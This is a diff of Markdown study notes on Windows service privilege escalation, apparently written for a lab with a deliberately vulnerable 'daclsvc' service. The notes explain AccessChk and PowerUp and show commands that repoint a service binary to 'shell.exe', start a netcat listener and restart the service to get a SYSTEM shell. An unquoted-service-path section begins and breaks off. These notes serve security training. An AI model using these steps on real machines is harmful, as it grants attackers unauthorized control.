@@ -32,6 +32,7 @@ Vulnerable Setup (Insecure):
 
 ### Step 2: Finding Vulnerable Services
 #### ==Tool 1: AccessChk (Sysinternals)==
+(AccessChk = Permission Checker Tool
 ```
 # Download accesschk.exe first or can be preinstalled
 # Check service permissions for all users
@@ -50,6 +51,8 @@ SERVICE_STOP                ← You can stop service
 ```
 
 #### Tool 2: PowerUp (PowerShell)
+**PowerUp** = Automated Privilege Escalation Scanner
+Think of it as a robot that automatically finds Windows privilege escalation vulnerabilities for you.
 ```
 # Load PowerUp
 . .\PowerUp.ps1
@@ -62,6 +65,10 @@ Get-ModifiableService
 ```
 
 #### Example: You find "daclsvc" service with full permissions
+
+**DACL = Discretionary Access Control List**
+daclsvc is NOT a real service on production Windows systems. It's a deliberately vulnerable service created for training purposes in cybersecurity labs.
+
 
 ##### Step 1: Check current service configuration
 ```
@@ -127,3 +134,16 @@ nt authority\system
 | 5. Modify service | `sc config <service> binpath= "C:\Temp\shell.exe"` | Points service to your shell |
 | 6. Start listener | `nc -lvnp 4444` | Waits for connection |
 | 7. Restart service | `net stop <service>` then `net start <service>` | Triggers your payload |
+
+
+___
+
+# 02: Service Exploits - Unquoted Service Path
+
+**The Problem:**
+Windows doesn't know where a file path with spaces ends if it's not in quotes!
+
+Example:
+```
+C:\Program Files\My Service\service.exe
+```
